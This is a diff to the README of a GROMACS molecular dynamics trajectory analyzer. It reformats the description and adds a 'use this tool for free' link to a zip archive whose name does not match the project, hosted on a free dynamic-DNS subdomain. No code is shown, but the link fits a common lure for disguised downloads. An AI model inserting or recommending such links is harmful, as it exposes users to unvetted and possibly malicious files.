@@ -1,8 +1,10 @@
 # AI-Agent TrajectoryAnalyzer
 
-A modular, GROMACS-centric molecular dynamics (MD) trajectory analysis framework with an optional AI-assisted interface for structured task specification.
+<p align="justify">
+A modular, GROMACS-centric molecular dynamics (MD) trajectory analysis framework with an optional AI-assisted interface for structured task specification. This project provides a web-based UI for common MD trajectory analyses, backed by deterministic GROMACS execution modules. An optional AI agent converts natural-language requests into structured JSON tasks without directly executing simulations.
+</p>
 
-This project provides a web-based UI for common MD trajectory analyses, backed by deterministic GROMACS execution modules. An optional AI agent converts natural-language requests into structured JSON tasks without directly executing simulations.
+You can use this tool for free by clicking <a href="https://cadd.sean28299.dpdns.org/static/Probe-GridMap-Builder_package.zip">here</a>. 👉 [Live Demo](http://traj.sean28299.dpdns.org)
 
 ---
 
